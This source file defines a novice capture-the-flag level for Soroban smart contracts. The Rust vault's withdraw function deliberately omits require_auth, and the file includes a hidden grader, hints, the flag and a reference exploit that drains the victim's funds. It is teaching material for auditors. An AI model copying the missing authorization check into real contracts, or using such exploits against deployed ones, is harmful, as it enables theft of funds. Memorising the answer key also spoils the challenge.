import "server-only";

import type { CtfLevel } from "../types";
import { LIB_RS, cargoToml } from "./shared";

// Level 01 — THE OPEN GATE.
//
// A vault moves balances between accounts. `deposit` asks the depositor to
// sign; `withdraw` moves someone else's money and asks for nothing. The
// player's exploit is the missing `require_auth` call, written as a client
// invocation from `src/exploit.rs`.
//
// The fixed project is deliberately small: Cargo.toml + lib.rs + level.rs.
// The player edits only exploit.rs, so the surface they can break is one
// function with a stable signature.

const LEVEL_RS = `//! The Gate of Saint Stroop — a tiny vault.
//!
//! Read this file. The exploit lives in the gap between the two functions.

#![allow(dead_code)]

use soroban_sdk::{contract, contractimpl, contracttype, Address, Env};

#[contracttype]
pub enum DataKey {
    /// One ledger entry per address: DataKey::Balance(addr) -> i128.
    Balance(Address),
}

#[contract]
pub struct Vault;

#[contractimpl]
impl Vault {
    /// Credit \`from\` with \`amount\`. The depositor must sign.
    pub fn deposit(env: Env, from: Address, amount: i128) {
        from.require_auth();
        if amount <= 0 {
            panic!("amount must be positive");
        }
        let current = read_balance(&env, &from);
        write_balance(&env, &from, current + amount);
    }

    /// Move \`amount\` from \`from\` to \`to\`.
    ///
    /// The gate is open: this function trusts the caller to name the account
    /// it is spending from.
    pub fn withdraw(env: Env, from: Address, to: Address, amount: i128) {
        if amount <= 0 {
            panic!("amount must be positive");
        }
        let from_balance = read_balance(&env, &from);
        if from_balance < amount {
            panic!("insufficient balance");
        }
        write_balance(&env, &from, from_balance - amount);

        let to_balance = read_balance(&env, &to);
        write_balance(&env, &to, to_balance + amount);
    }

    /// Public view: the vault's ledger is readable by anyone.
    pub fn balance_of(env: Env, who: Address) -> i128 {
        read_balance(&env, &who)
    }
}

fn read_balance(env: &Env, who: &Address) -> i128 {
    env.storage()
        .instance()
        .get::<DataKey, i128>(&DataKey::Balance(who.clone()))
        .unwrap_or(0)
}

fn write_balance(env: &Env, who: &Address, amount: i128) {
    env.storage()
        .instance()
        .set(&DataKey::Balance(who.clone()), &amount);
}
`;

const STARTER_RS = `// Only this file is yours to edit.
//
// The grader deploys a fresh vault, funds \`victim\`, then calls this
// function. Make \`attacker\` end up with the victim's balance.
//
// The signature is fixed: change the body, not the parameters.
use soroban_sdk::{Address, Env};

use crate::level::VaultClient;

pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address) {
    let _ = (env, vault, victim, attacker);
    // TODO: read src/level.rs, find the check that was never written, and
    // move the victim's funds to the attacker.
}
`;

const HARNESS = `// Hidden grader — never sent to the browser.
//
// The victim funds the vault with a real authorization, then every mock is
// dropped. If the contract asked for the victim's signature on withdraw, the
// exploit would panic here; because it does not, the exploit drains the vault.
use open_gate::exploit;
use open_gate::level::{Vault, VaultClient};
use soroban_sdk::testutils::Address as _;
use soroban_sdk::{Address, Env};

#[test]
fn ctf_win() {
    let env = Env::default();
    let vault_id = env.register(Vault, ());
    let client = VaultClient::new(&env, &vault_id);

    let victim = Address::generate(&env);
    let attacker = Address::generate(&env);

    // Fund the vault as the victim, then remove the training wheels.
    env.mock_all_auths();
    client.deposit(&victim, &1_000);
    env.set_auths(&[]);

    assert_eq!(client.balance_of(&victim), 1_000, "setup failed");
    assert_eq!(client.balance_of(&attacker), 0, "setup failed");

    exploit::solve(&env, vault_id.clone(), victim.clone(), attacker.clone());

    assert_eq!(
        client.balance_of(&victim),
        0,
        "the victim still holds funds — the gate held"
    );
    assert_eq!(
        client.balance_of(&attacker),
        1_000,
        "the attacker did not receive the victim's funds"
    );

    // Last statement, reached only when every assertion above held. The nonce
    // is minted per run by the server and exists nowhere the exploit can read.
    println!("CTF_WIN __CTF_NONCE__");
}
`;

const REFERENCE_RS = `use soroban_sdk::{Address, Env};

use crate::level::VaultClient;

pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address) {
    let client = VaultClient::new(env, &vault);
    let amount = client.balance_of(&victim);
    // withdraw() never calls from.require_auth(), so naming the victim is
    // enough to spend their balance.
    client.withdraw(&victim, &attacker, &amount);
}
`;

export const openGate: CtfLevel = {
  slug: "open-gate",
  title: "The Open Gate",
  tagline:
    "A vault that asks the depositor to sign — and then lets anyone spend the deposit.",
  difficulty: "novice",
  estMinutes: 15,
  story: `The Gate of Saint Stroop has stood for a hundred ledgers. Its keeper sleeps, its vault is full, and the only thing standing between the townsfolk and their savings is a single line of Rust that was never written.

You are the auditor the keeper never hired.`,
  brief: `## The target

\`src/level.rs\` is a small vault. \`deposit\` asks the depositor for a signature. \`withdraw\` moves funds between two accounts — and asks for nothing.

## Your job

\`src/exploit.rs\` exports one function:

\`\`\`rust
pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address)
\`\`\`

The grader deploys a fresh vault, funds \`victim\` with **1,000**, drops every authorization mock, then calls your \`solve\`. Make \`attacker\` walk away with the victim's balance.

## Rules

- You may edit **only** \`src/exploit.rs\`. \`Cargo.toml\`, \`src/lib.rs\` and \`src/level.rs\` are fixed by the level.
- Keep the \`solve\` signature exactly as written.
- The hidden test runs inside the same sandbox as the Forge: no network, no keys, no host filesystem.

## Reading the ledger

\`balance_of(who)\` is a public view. Use it to discover how much is there before you move it.`,
  hints: [
    "Compare `deposit` and `withdraw` line by line. Which one calls `require_auth`?",
    "`withdraw(from, to, amount)` trusts the `from` argument. The vault never verifies that the caller is `from`.",
    "You do not need a signature. You need the right arguments: the victim as `from`, the attacker as `to`, and the victim's balance as `amount`.",
  ],
  files: {
    "Cargo.toml": cargoToml("open_gate"),
    "src/lib.rs": LIB_RS,
    "src/level.rs": LEVEL_RS,
  },
  starter: STARTER_RS,
  harness: HARNESS,
  winTest: "test ctf_win ... ok",
  // The solution is a client call. Direct storage access has no business here.
  forbid: ["storage"],
  flag: "TUSST{th3_g4t3_w4s_0p3n}",
  reference: REFERENCE_RS,
};
